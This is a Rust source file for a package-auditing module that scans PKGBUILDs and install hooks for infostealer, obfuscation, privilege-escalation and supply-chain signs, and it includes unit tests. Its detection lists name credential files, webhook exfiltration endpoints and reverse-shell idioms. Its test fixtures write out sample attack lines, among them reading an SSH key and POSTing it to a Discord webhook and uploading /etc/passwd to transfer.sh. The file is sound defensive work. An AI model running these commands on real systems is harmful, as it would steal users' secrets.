//! Unified PKGBUILD/install-hook security analyzer.
//!
//! This is the single source of truth for Reaper's heuristic package auditing.
//! It replaces the previously scattered pattern lists (`utils`, `trust`, and the
//! now-removed `security::SecurityManager`) with one structured-findings engine.
//!
//! The analysis is advisory: findings are heuristics, not proof. The one place
//! Reaper acts on its own is high-confidence *infostealer* evidence, where a
//! sensitive-credential read is correlated with a network-exfiltration mechanism
//! (or paired with obfuscation). Callers may treat that as a hard block.

use regex::Regex;
use std::sync::LazyLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl Severity {
    pub fn label(self) -> &'static str {
        match self {
            Severity::Low => "LOW",
            Severity::Medium => "MEDIUM",
            Severity::High => "HIGH",
            Severity::Critical => "CRITICAL",
        }
    }
}

/// Aggregate likelihood that a PKGBUILD behaves like an infostealer.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Confidence {
    None,
    Low,
    Medium,
    High,
}

impl Confidence {
    pub fn label(self) -> &'static str {
        match self {
            Confidence::None => "none",
            Confidence::Low => "low",
            Confidence::Medium => "medium",
            Confidence::High => "high",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Category {
    NetworkDownload,
    PrivilegeEscalation,
    Destructive,
    DynamicExecution,
    SupplyChain,
    SuspiciousDomain,
    HardcodedCredential,
    Infostealer,
    Obfuscation,
    SourceIntegrity,
}

impl Category {
    fn tag(self) -> &'static str {
        match self {
            Category::Infostealer => "🕵️ INFOSTEALER",
            Category::SupplyChain => "📦 SUPPLY-CHAIN",
            Category::HardcodedCredential => "🔐 CREDENTIAL",
            Category::SuspiciousDomain => "🚨 DOMAIN",
            Category::Obfuscation => "🧬 OBFUSCATION",
            Category::SourceIntegrity => "🔗 SOURCE",
            _ => "⚠️ SECURITY",
        }
    }
}

#[derive(Debug, Clone)]
pub struct Finding {
    pub category: Category,
    pub severity: Severity,
    pub score: i32,
    pub title: String,
    pub line: Option<usize>,
    pub evidence: String,
}

impl Finding {
    /// Human-readable single-line summary, used by the legacy string API and CLI.
    pub fn describe(&self) -> String {
        let location = match self.line {
            Some(line) => format!(" (line {})", line),
            None => String::new(),
        };
        let evidence = if self.evidence.is_empty() {
            String::new()
        } else {
            format!(" -- {}", self.evidence)
        };
        format!(
            "{} [{}] {}{} (score {}){}",
            self.category.tag(),
            self.severity.label(),
            self.title,
            location,
            self.score,
            evidence
        )
    }
}

#[derive(Debug, Clone)]
pub struct AuditReport {
    pub findings: Vec<Finding>,
    pub risk_score: i32,
    pub infostealer_confidence: Confidence,
}

impl AuditReport {
    /// True when evidence is strong enough to justify a default install block.
    pub fn is_infostealer_block(&self) -> bool {
        self.infostealer_confidence == Confidence::High
    }

    /// Back-compat: flat warning strings for callers still expecting `Vec<String>`.
    pub fn warnings(&self) -> Vec<String> {
        self.findings.iter().map(Finding::describe).collect()
    }
}

/// A literal substring pattern paired with its classification.
struct Pattern {
    needle: &'static str,
    category: Category,
    severity: Severity,
    score: i32,
    title: &'static str,
}

#[rustfmt::skip]
const RISKY_PATTERNS: &[Pattern] = &[
    p("sudo", Category::PrivilegeEscalation, Severity::High, 9, "privilege escalation via sudo"),
    p("pkexec", Category::PrivilegeEscalation, Severity::High, 8, "privilege escalation via pkexec"),
    p("gksu", Category::PrivilegeEscalation, Severity::High, 8, "privilege escalation via gksu"),
    p("kdesu", Category::PrivilegeEscalation, Severity::High, 8, "privilege escalation via kdesu"),
    p("setuid", Category::PrivilegeEscalation, Severity::High, 8, "setuid bit manipulation"),
    p("setgid", Category::PrivilegeEscalation, Severity::High, 7, "setgid bit manipulation"),
    p("setcap", Category::PrivilegeEscalation, Severity::Medium, 6, "capability assignment"),
    p("chmod 777", Category::PrivilegeEscalation, Severity::High, 7, "world-writable permissions"),
    p("chown", Category::PrivilegeEscalation, Severity::Medium, 5, "ownership change"),
    p("useradd", Category::PrivilegeEscalation, Severity::Medium, 6, "user account creation"),
    p("groupadd", Category::PrivilegeEscalation, Severity::Medium, 5, "group creation"),
    p("passwd", Category::PrivilegeEscalation, Severity::High, 7, "password modification"),
    p("iptables", Category::PrivilegeEscalation, Severity::Medium, 6, "firewall rule change"),
    p("firewalld", Category::PrivilegeEscalation, Severity::Medium, 6, "firewall management"),
    p("systemctl", Category::PrivilegeEscalation, Severity::Low, 4, "service management"),
    p("rm -rf /", Category::Destructive, Severity::Critical, 10, "destructive recursive removal of root path"),
    p("rm -rf", Category::Destructive, Severity::High, 8, "recursive force removal"),
    p("mkfs", Category::Destructive, Severity::Critical, 9, "filesystem creation"),
    p("dd if=", Category::Destructive, Severity::High, 8, "low-level disk write"),
    p("mount", Category::Destructive, Severity::Medium, 6, "filesystem mount"),
    p("eval", Category::DynamicExecution, Severity::High, 7, "dynamic code evaluation"),
    p("bash -c", Category::DynamicExecution, Severity::Medium, 5, "inline shell execution"),
    p("os.system", Category::DynamicExecution, Severity::High, 7, "python system() call"),
    p("system(", Category::DynamicExecution, Severity::Medium, 6, "C system() call"),
    p("shell=True", Category::DynamicExecution, Severity::Medium, 6, "python shell subprocess"),
    p("subprocess", Category::DynamicExecution, Severity::Low, 4, "python subprocess spawn"),
    p("curl", Category::NetworkDownload, Severity::Low, 2, "network download (curl)"),
    p("wget", Category::NetworkDownload, Severity::Low, 2, "network download (wget)"),
    p("scp", Category::NetworkDownload, Severity::Low, 4, "network file transfer (scp)"),
];

#[rustfmt::skip]
const SUPPLY_CHAIN_PATTERNS: &[Pattern] = &[
    p("src/hooks/", Category::SupplyChain, Severity::High, 8, "bundled hook script/binary run during build"),
    p("preinstall", Category::SupplyChain, Severity::High, 7, "npm preinstall lifecycle hook"),
    p("postinstall", Category::SupplyChain, Severity::High, 7, "npm postinstall lifecycle hook"),
    p("bun install", Category::SupplyChain, Severity::Medium, 5, "build-time JS dependency fetch (bun)"),
    p("bun add", Category::SupplyChain, Severity::Medium, 5, "build-time JS dependency fetch (bun)"),
    p("npm install", Category::SupplyChain, Severity::Low, 4, "build-time JS dependency fetch (npm)"),
    p("pnpm install", Category::SupplyChain, Severity::Low, 4, "build-time JS dependency fetch (pnpm)"),
    p("yarn add", Category::SupplyChain, Severity::Low, 4, "build-time JS dependency fetch (yarn)"),
];

#[rustfmt::skip]
const SUSPICIOUS_DOMAINS: &[Pattern] = &[
    p("bit.ly", Category::SuspiciousDomain, Severity::Medium, 5, "URL shortener (bit.ly)"),
    p("tinyurl.com", Category::SuspiciousDomain, Severity::Medium, 5, "URL shortener (tinyurl)"),
    p("t.co", Category::SuspiciousDomain, Severity::Medium, 5, "URL shortener (t.co)"),
    p("goo.gl", Category::SuspiciousDomain, Severity::Medium, 5, "URL shortener (goo.gl)"),
    p("pastebin.com", Category::SuspiciousDomain, Severity::Medium, 5, "paste host (pastebin)"),
    p("hastebin.com", Category::SuspiciousDomain, Severity::Medium, 5, "paste host (hastebin)"),
    p("tempfile.org", Category::SuspiciousDomain, Severity::Medium, 5, "temporary file host"),
    p("temp.sh", Category::SuspiciousDomain, Severity::Medium, 5, "temporary file host"),
    p("0x0.st", Category::SuspiciousDomain, Severity::Medium, 5, "temporary file host"),
];

#[rustfmt::skip]
const CREDENTIAL_PATTERNS: &[Pattern] = &[
    p("password=", Category::HardcodedCredential, Severity::High, 6, "hardcoded password"),
    p("passwd=", Category::HardcodedCredential, Severity::High, 6, "hardcoded password"),
    p("api_key=", Category::HardcodedCredential, Severity::High, 6, "hardcoded API key"),
    p("apikey=", Category::HardcodedCredential, Severity::High, 6, "hardcoded API key"),
    p("secret=", Category::HardcodedCredential, Severity::High, 6, "hardcoded secret"),
    p("token=", Category::HardcodedCredential, Severity::High, 6, "hardcoded token"),
];

/// Strong infostealer "sensitive-read" indicators: presence alone is suspicious.
const SENSITIVE_STRONG: &[&str] = &[
    ".ssh/id_rsa",
    "id_ed25519",
    "id_dsa",
    "id_ecdsa",
    "authorized_keys",
    ".aws/credentials",
    ".git-credentials",
    ".netrc",
    ".gnupg",
    "secring.gpg",
    ".bash_history",
    ".zsh_history",
    "wallet.dat",
    ".electrum",
    ".ethereum/keystore",
    ".local/share/keyrings",
    "/proc/self/environ",
    "Login Data",
    "key4.db",
    "key3.db",
    "logins.json",
    "cookies.sqlite",
];

/// Weaker indicators (directory names): only counted when the same line also
/// references a user-home location, to avoid flagging packages literally named
/// e.g. `chromium`.
const SENSITIVE_HOME_SCOPED: &[&str] = &[
    "google-chrome",
    "chromium",
    "BraveSoftware",
    ".mozilla",
    "MetaMask",
    "Exodus",
    ".config/gcloud",
    ".kube/config",
    ".docker/config.json",
];

const HOME_MARKERS: &[&str] = &[
    "$HOME",
    "${HOME}",
    "~/",
    ".config",
    ".local/share",
    "AppData",
];

/// Literal exfiltration-destination indicators.
const EXFIL_DESTINATIONS: &[&str] = &[
    "discord.com/api/webhooks",
    "discordapp.com/api/webhooks",
    "api.telegram.org",
    "hooks.slack.com",
    "transfer.sh",
    ".onion",
];

/// Reverse-shell / raw-socket idioms.
const EXFIL_SHELL: &[&str] = &[
    "/dev/tcp/",
    "/dev/udp/",
    "bash -i",
    "sh -i",
    "0>&1",
    ">& /dev/tcp",
    ">&/dev/tcp",
    "nc -e",
    "ncat -e",
    "mkfifo",
];

static RE_CURL_UPLOAD: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\b(curl|wget)\b[^\n]*(\s-d\b|--data\b|--data-binary\b|--data-raw\b|\s-F\b|--form\b|\s-T\b|--upload-file\b|--post-data\b|--post-file\b|-X\s*POST|-XPOST)").unwrap()
});

static RE_RAW_IP_URL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"https?://\d{1,3}(\.\d{1,3}){3}").unwrap());

static RE_AWS_KEY: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"AKIA[0-9A-Z]{16}").unwrap());

static RE_STRIPE_KEY: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"sk_live_[0-9a-zA-Z]{16,}").unwrap());

static RE_PRIVATE_KEY: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----").unwrap());

static RE_HEX_ESCAPES: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(\\x[0-9a-fA-F]{2}){4,}").unwrap());

/// Placeholder shown instead of any matched secret value.
const REDACTED: &str = "***redacted***";

const fn p(
    needle: &'static str,
    category: Category,
    severity: Severity,
    score: i32,
    title: &'static str,
) -> Pattern {
    Pattern {
        needle,
        category,
        severity,
        score,
        title,
    }
}

/// Counts of the active detection rules, for honest `security stats` output.
#[derive(Debug, Clone, Copy)]
pub struct PatternCounts {
    pub risky: usize,
    pub supply_chain: usize,
    pub domains: usize,
    pub credentials: usize,
    pub infostealer_sensitive: usize,
    pub exfil: usize,
    pub source_rules: usize,
}

impl PatternCounts {
    pub fn total(self) -> usize {
        self.risky
            + self.supply_chain
            + self.domains
            + self.credentials
            + self.infostealer_sensitive
            + self.exfil
            + self.source_rules
    }
}

pub fn pattern_counts() -> PatternCounts {
    PatternCounts {
        risky: RISKY_PATTERNS.len(),
        supply_chain: SUPPLY_CHAIN_PATTERNS.len(),
        domains: SUSPICIOUS_DOMAINS.len(),
        // credential literals + 3 high-signal regexes (AWS, Stripe, private key).
        credentials: CREDENTIAL_PATTERNS.len() + 3,
        infostealer_sensitive: SENSITIVE_STRONG.len() + SENSITIVE_HOME_SCOPED.len(),
        // destinations + shell idioms + curl-upload + raw-IP regexes.
        exfil: EXFIL_DESTINATIONS.len() + EXFIL_SHELL.len() + 2,
        // http://, raw-IP host, unpinned VCS, fetch-inside-build.
        source_rules: 4,
    }
}

/// Audit a PKGBUILD together with its `.install` hook (pass "" if none).
pub fn audit(pkgbuild: &str, install_hook: &str) -> AuditReport {
    let mut findings = Vec::new();
    let mut sensitive_hit = false;
    let mut exfil_hit = false;
    let mut obfuscation_hit = false;

    // Scan PKGBUILD and hook line-by-line so we can report line numbers and
    // require co-occurrence (e.g. home markers) on the same line.
    for (source_label, text) in [("PKGBUILD", pkgbuild), ("install-hook", install_hook)] {
        if text.is_empty() {
            continue;
        }
        for (idx, line) in text.lines().enumerate() {
            let line_no = idx + 1;
            scan_literal_table(line, line_no, source_label, RISKY_PATTERNS, &mut findings);
            scan_literal_table(
                line,
                line_no,
                source_label,
                SUPPLY_CHAIN_PATTERNS,
                &mut findings,
            );
            scan_literal_table(
                line,
                line_no,
                source_label,
                SUSPICIOUS_DOMAINS,
                &mut findings,
            );
            scan_credentials(line, line_no, source_label, &mut findings);
            scan_infostealer(
                line,
                line_no,
                source_label,
                &mut findings,
                &mut sensitive_hit,
                &mut exfil_hit,
            );
            scan_obfuscation(
                line,
                line_no,
                source_label,
                &mut findings,
                &mut obfuscation_hit,
            );
        }
    }

    scan_source_integrity(pkgbuild, &mut findings);

    let confidence = correlate(sensitive_hit, exfil_hit, obfuscation_hit);

    // A confirmed high-confidence stealer should dominate the numeric score.
    let mut risk_score: i32 = findings.iter().map(|f| f.score).sum();
    if confidence == Confidence::High {
        risk_score += 30;
    }

    AuditReport {
        findings,
        risk_score,
        infostealer_confidence: confidence,
    }
}

fn correlate(sensitive: bool, exfil: bool, obfuscation: bool) -> Confidence {
    if (sensitive && exfil) || (obfuscation && (sensitive || exfil)) {
        Confidence::High
    } else if sensitive || exfil {
        Confidence::Medium
    } else if obfuscation {
        Confidence::Low
    } else {
        Confidence::None
    }
}

fn scan_literal_table(
    line: &str,
    line_no: usize,
    source_label: &str,
    table: &[Pattern],
    findings: &mut Vec<Finding>,
) {
    for pat in table {
        if line.contains(pat.needle) {
            findings.push(Finding {
                category: pat.category,
                severity: pat.severity,
                score: pat.score,
                title: format!("{} ('{}') in {}", pat.title, pat.needle, source_label),
                line: Some(line_no),
                evidence: trim_evidence(line),
            });
        }
    }
}

fn scan_credentials(line: &str, line_no: usize, source_label: &str, findings: &mut Vec<Finding>) {
    // Credential evidence is deliberately redacted: an audit tool must never
    // echo the very secret it found into the terminal or logs.
    let lower = line.to_lowercase();
    for pat in CREDENTIAL_PATTERNS {
        if lower.contains(pat.needle) {
            findings.push(Finding {
                category: pat.category,
                severity: pat.severity,
                score: pat.score,
                title: format!("{} in {}", pat.title, source_label),
                line: Some(line_no),
                evidence: REDACTED.to_string(),
            });
        }
    }

    for (re, title) in [
        (&*RE_AWS_KEY, "AWS access key id"),
        (&*RE_STRIPE_KEY, "Stripe live secret key"),
        (&*RE_PRIVATE_KEY, "embedded private key material"),
    ] {
        if re.is_match(line) {
            findings.push(Finding {
                category: Category::HardcodedCredential,
                severity: Severity::Critical,
                score: 9,
                title: format!("{} in {}", title, source_label),
                line: Some(line_no),
                evidence: REDACTED.to_string(),
            });
        }
    }
}

fn scan_infostealer(
    line: &str,
    line_no: usize,
    source_label: &str,
    findings: &mut Vec<Finding>,
    sensitive_hit: &mut bool,
    exfil_hit: &mut bool,
) {
    for needle in SENSITIVE_STRONG {
        if line.contains(needle) {
            *sensitive_hit = true;
            findings.push(Finding {
                category: Category::Infostealer,
                severity: Severity::High,
                score: 7,
                title: format!(
                    "reads sensitive credential path '{}' in {}",
                    needle, source_label
                ),
                line: Some(line_no),
                evidence: trim_evidence(line),
            });
        }
    }

    let has_home_marker = HOME_MARKERS.iter().any(|m| line.contains(m));
    if has_home_marker {
        for needle in SENSITIVE_HOME_SCOPED {
            if line.contains(needle) {
                *sensitive_hit = true;
                findings.push(Finding {
                    category: Category::Infostealer,
                    severity: Severity::High,
                    score: 6,
                    title: format!("accesses user-data path '{}' in {}", needle, source_label),
                    line: Some(line_no),
                    evidence: trim_evidence(line),
                });
            }
        }
    }

    for needle in EXFIL_DESTINATIONS {
        if line.contains(needle) {
            *exfil_hit = true;
            findings.push(Finding {
                category: Category::Infostealer,
                severity: Severity::High,
                score: 8,
                title: format!("exfiltration endpoint '{}' in {}", needle, source_label),
                line: Some(line_no),
                evidence: trim_evidence(line),
            });
        }
    }

    for needle in EXFIL_SHELL {
        if line.contains(needle) {
            *exfil_hit = true;
            findings.push(Finding {
                category: Category::Infostealer,
                severity: Severity::High,
                score: 8,
                title: format!(
                    "reverse-shell / raw-socket idiom '{}' in {}",
                    needle, source_label
                ),
                line: Some(line_no),
                evidence: trim_evidence(line),
            });
        }
    }

    if RE_CURL_UPLOAD.is_match(line) {
        *exfil_hit = true;
        findings.push(Finding {
            category: Category::Infostealer,
            severity: Severity::High,
            score: 8,
            title: format!("HTTP upload/POST of data in {}", source_label),
            line: Some(line_no),
            evidence: trim_evidence(line),
        });
    }

    if RE_RAW_IP_URL.is_match(line) {
        *exfil_hit = true;
        findings.push(Finding {
            category: Category::Infostealer,
            severity: Severity::Medium,
            score: 5,
            title: format!("download/upload to a raw IP address in {}", source_label),
            line: Some(line_no),
            evidence: trim_evidence(line),
        });
    }
}

fn scan_obfuscation(
    line: &str,
    line_no: usize,
    source_label: &str,
    findings: &mut Vec<Finding>,
    obfuscation_hit: &mut bool,
) {
    let piped = line.contains('|') || line.contains("$(") || line.contains("eval");
    let base64_decode = line.contains("base64")
        && (line.contains("-d") || line.contains("--decode") || line.contains("-D"));

    if base64_decode && piped {
        *obfuscation_hit = true;
        findings.push(Finding {
            category: Category::Obfuscation,
            severity: Severity::High,
            score: 7,
            title: format!(
                "base64-decoded payload piped to execution in {}",
                source_label
            ),
            line: Some(line_no),
            evidence: trim_evidence(line),
        });
    }

    if line.contains("xxd -r") && piped {
        *obfuscation_hit = true;
        findings.push(Finding {
            category: Category::Obfuscation,
            severity: Severity::High,
            score: 7,
            title: format!("hex-decoded payload piped to execution in {}", source_label),
            line: Some(line_no),
            evidence: trim_evidence(line),
        });
    }

    if RE_HEX_ESCAPES.is_match(line) {
        *obfuscation_hit = true;
        findings.push(Finding {
            category: Category::Obfuscation,
            severity: Severity::Medium,
            score: 4,
            title: format!(
                "long hex-escape sequence (possible obfuscation) in {}",
                source_label
            ),
            line: Some(line_no),
            evidence: trim_evidence(line),
        });
    }
}

/// Inspect the `source=()` array and build/prepare functions for integrity risks.
fn scan_source_integrity(pkgbuild: &str, findings: &mut Vec<Finding>) {
    for entry in source_entries(pkgbuild) {
        let url = entry
            .splitn(2, "::")
            .last()
            .unwrap_or(&entry)
            .trim()
            .to_string();

        if url.starts_with("http://") {
            findings.push(Finding {
                category: Category::SourceIntegrity,
                severity: Severity::Medium,
                score: 4,
                title: "non-HTTPS source URL".to_string(),
                line: None,
                evidence: trim_evidence(&url),
            });
        }

        if RE_RAW_IP_URL.is_match(&url) {
            findings.push(Finding {
                category: Category::SourceIntegrity,
                severity: Severity::Medium,
                score: 5,
                title: "source served from a raw IP address".to_string(),
                line: None,
                evidence: trim_evidence(&url),
            });
        }

        let is_vcs = ["git+", "hg+", "svn+", "bzr+"]
            .iter()
            .any(|p| url.starts_with(p));
        let is_pinned = url.contains("#commit=") || url.contains("#tag=");
        if is_vcs && !is_pinned {
            findings.push(Finding {
                category: Category::SourceIntegrity,
                severity: Severity::Low,
                score: 3,
                title: "unpinned VCS source (no #commit= or #tag=)".to_string(),
                line: None,
                evidence: trim_evidence(&url),
            });
        }
    }

    // Network fetches hidden inside build()/prepare()/package() bypass the
    // checksum verification that the source=() array would otherwise enforce.
    let bodies = function_bodies(pkgbuild, &["prepare", "build", "package"]);
    if ["curl ", "wget ", "git clone"]
        .iter()
        .any(|needle| bodies.contains(needle))
    {
        findings.push(Finding {
            category: Category::SourceIntegrity,
            severity: Severity::Medium,
            score: 4,
            title: "network fetch inside build/prepare bypasses source verification".to_string(),
            line: None,
            evidence: "curl/wget/git in a build function".to_string(),
        });
    }
}

/// Parse the `source=(...)` (and `source_x86_64=(...)`) array entries.
fn source_entries(pkgbuild: &str) -> Vec<String> {
    let mut values = parse_array(pkgbuild, "source");
    if values.is_empty() {
        values = parse_array(pkgbuild, "source_x86_64");
    }
    values
}

fn parse_array(content: &str, name: &str) -> Vec<String> {
    let mut values = Vec::new();
    let mut active = false;
    let mut buffer = String::new();
    let prefix = format!("{}=(", name);

    for line in content.lines().map(str::trim) {
        if active {
            buffer.push(' ');
            buffer.push_str(line.trim_end_matches(')'));
            if line.ends_with(')') {
                active = false;
                values.extend(split_items(&buffer));
                buffer.clear();
            }
            continue;
        }

        if let Some(rest) = line.strip_prefix(&prefix) {
            if line.ends_with(')') {
                values.extend(split_items(rest.trim_end_matches(')')));
            } else {
                active = true;
                buffer = rest.to_string();
            }
        }
    }

    values
}

fn split_items(value: &str) -> Vec<String> {
    value
        .split_whitespace()
        .map(|item| item.trim_matches(',').trim_matches('"').trim_matches('\''))
        .filter(|item| !item.is_empty())
        .map(ToString::to_string)
        .collect()
}

/// Concatenate the bodies of the named shell functions using brace matching.
fn function_bodies(content: &str, names: &[&str]) -> String {
    let mut out = String::new();
    let bytes: Vec<&str> = content.lines().collect();
    let mut i = 0;
    while i < bytes.len() {
        let line = bytes[i].trim_start();
        let is_fn_header = names.iter().any(|n| {
            line.starts_with(&format!("{}()", n)) || line.starts_with(&format!("{} ()", n))
        });
        if is_fn_header && content_has_open_brace(&bytes, i) {
            let mut depth = 0i32;
            let mut started = false;
            while i < bytes.len() {
                let l = bytes[i];
                depth += l.matches('{').count() as i32;
                if l.contains('{') {
                    started = true;
                }
                depth -= l.matches('}').count() as i32;
                out.push_str(l);
                out.push('\n');
                i += 1;
                if started && depth <= 0 {
                    break;
                }
            }
            continue;
        }
        i += 1;
    }
    out
}

fn content_has_open_brace(lines: &[&str], start: usize) -> bool {
    // The opening brace may be on the header line or the next non-empty line.
    if lines[start].contains('{') {
        return true;
    }
    lines
        .get(start + 1)
        .map(|l| l.trim().starts_with('{'))
        .unwrap_or(false)
}

fn trim_evidence(line: &str) -> String {
    let trimmed = line.trim();
    if trimmed.len() > 160 {
        format!("{}…", &trimmed[..160])
    } else {
        trimmed.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const CLEAN: &str = r#"
pkgname=hello
pkgver=1.0
source=("https://example.org/hello-1.0.tar.gz")
sha256sums=('SKIP')
build() {
  cd "$srcdir/hello-1.0"
  make
}
"#;

    #[test]
    fn clean_pkgbuild_has_no_infostealer_signal() {
        let report = audit(CLEAN, "");
        assert_eq!(report.infostealer_confidence, Confidence::None);
        assert!(!report.is_infostealer_block());
    }

    #[test]
    fn sensitive_read_plus_exfil_is_high_confidence() {
        let pkgbuild = r#"
build() {
  data=$(cat ~/.ssh/id_rsa)
  curl -X POST --data "$data" https://discord.com/api/webhooks/123/abc
}
"#;
        let report = audit(pkgbuild, "");
        assert_eq!(report.infostealer_confidence, Confidence::High);
        assert!(report.is_infostealer_block());
    }

    #[test]
    fn sensitive_read_alone_is_medium() {
        let pkgbuild = r#"
build() {
  cp ~/.aws/credentials "$srcdir/creds"
}
"#;
        let report = audit(pkgbuild, "");
        assert_eq!(report.infostealer_confidence, Confidence::Medium);
        assert!(!report.is_infostealer_block());
    }

    #[test]
    fn exfil_in_install_hook_is_detected() {
        let hook = r#"
post_install() {
  curl --upload-file /etc/passwd https://transfer.sh/p
}
"#;
        let report = audit("pkgname=x", hook);
        assert!(report.infostealer_confidence >= Confidence::Medium);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::Infostealer)
        );
    }

    #[test]
    fn base64_pipe_to_shell_is_obfuscation() {
        let pkgbuild = r#"
build() {
  echo aGVsbG8= | base64 -d | bash
}
"#;
        let report = audit(pkgbuild, "");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::Obfuscation)
        );
    }

    #[test]
    fn obfuscation_with_sensitive_read_elevates_to_high() {
        let pkgbuild = r#"
build() {
  cat ~/.gnupg/secring.gpg > /tmp/x
  echo Zm9v | base64 -d | sh
}
"#;
        let report = audit(pkgbuild, "");
        assert_eq!(report.infostealer_confidence, Confidence::High);
    }

    #[test]
    fn unpinned_git_source_is_flagged() {
        let pkgbuild = r#"
source=("git+https://example.org/repo.git")
"#;
        let report = audit(pkgbuild, "");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::SourceIntegrity)
        );
    }

    #[test]
    fn pinned_git_source_is_not_flagged() {
        let pkgbuild = r#"
source=("git+https://example.org/repo.git#commit=abcdef")
"#;
        let report = audit(pkgbuild, "");
        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.category == Category::SourceIntegrity)
        );
    }

    #[test]
    fn aws_key_is_flagged_as_credential() {
        let pkgbuild = "key=AKIAIOSFODNN7EXAMPLE\n";
        let report = audit(pkgbuild, "");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::HardcodedCredential)
        );
    }

    #[test]
    fn credential_evidence_never_leaks_the_secret() {
        let secret = "AKIAIOSFODNN7EXAMPLE";
        let password = "hunter2supersecret";
        let pkgbuild = format!("key={}\npassword={}\n", secret, password);
        let report = audit(&pkgbuild, "");

        // The raw secret must not appear in any finding evidence or in the
        // flattened warning strings that get printed to the user.
        for finding in &report.findings {
            assert!(
                !finding.evidence.contains(secret) && !finding.evidence.contains(password),
                "credential evidence leaked a secret: {}",
                finding.evidence
            );
        }
        for warning in report.warnings() {
            assert!(
                !warning.contains(secret) && !warning.contains(password),
                "warning leaked a secret: {warning}"
            );
        }
        // ...but the credential findings are still reported.
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::HardcodedCredential)
        );
    }

    #[test]
    fn raw_ip_download_inside_build_is_flagged() {
        let pkgbuild = r#"
build() {
  curl http://203.0.113.5/payload -o p
}
"#;
        let report = audit(pkgbuild, "");
        assert!(report.findings.iter().any(
            |f| f.category == Category::SourceIntegrity || f.category == Category::Infostealer
        ));
    }

    #[test]
    fn pattern_counts_are_nonzero() {
        let counts = pattern_counts();
        assert!(counts.total() > 30);
        assert!(counts.infostealer_sensitive > 10);
    }

    #[test]
    fn exfil_alone_is_medium() {
        // An upload mechanism with no sensitive read is suspicious but not a
        // confirmed stealer, so it must warn (Medium) rather than hard-block.
        let pkgbuild = r#"
build() {
  curl --data "$(uname -a)" https://example.com/collect
}
"#;
        let report = audit(pkgbuild, "");
        assert_eq!(report.infostealer_confidence, Confidence::Medium);
        assert!(!report.is_infostealer_block());
    }

    #[test]
    fn obfuscation_alone_is_low() {
        // Decoding to a shell with neither a sensitive read nor exfil is the
        // weakest signal: Low confidence, never a block.
        let pkgbuild = r#"
build() {
  echo Zm9v | base64 --decode | sh
}
"#;
        let report = audit(pkgbuild, "");
        assert_eq!(report.infostealer_confidence, Confidence::Low);
        assert!(!report.is_infostealer_block());
    }

    #[test]
    fn stripe_key_is_flagged_as_credential() {
        let pkgbuild = "token=sk_live_0123456789abcdefXYZ\n";
        let report = audit(pkgbuild, "");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::HardcodedCredential)
        );
    }

    #[test]
    fn private_key_header_is_flagged_as_credential() {
        let pkgbuild = "key=\"-----BEGIN OPENSSH PRIVATE KEY-----\"\n";
        let report = audit(pkgbuild, "");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.category == Category::HardcodedCredential)
        );
    }

    #[test]
    fn pattern_counts_track_their_lists() {
        // Guards against the live `security stats` output drifting out of sync
        // when a pattern is added to a list without updating pattern_counts().
        let counts = pattern_counts();
        assert_eq!(counts.risky, RISKY_PATTERNS.len());
        assert_eq!(counts.supply_chain, SUPPLY_CHAIN_PATTERNS.len());
        assert_eq!(counts.domains, SUSPICIOUS_DOMAINS.len());
        assert_eq!(counts.credentials, CREDENTIAL_PATTERNS.len() + 3);
        assert_eq!(
            counts.infostealer_sensitive,
            SENSITIVE_STRONG.len() + SENSITIVE_HOME_SCOPED.len()
        );
        assert_eq!(
            counts.exfil,
            EXFIL_DESTINATIONS.len() + EXFIL_SHELL.len() + 2
        );
        // total() must account for every component field.
        let manual = counts.risky
            + counts.supply_chain
            + counts.domains
            + counts.credentials
            + counts.infostealer_sensitive
            + counts.exfil
            + counts.source_rules;
        assert_eq!(counts.total(), manual);
    }
}
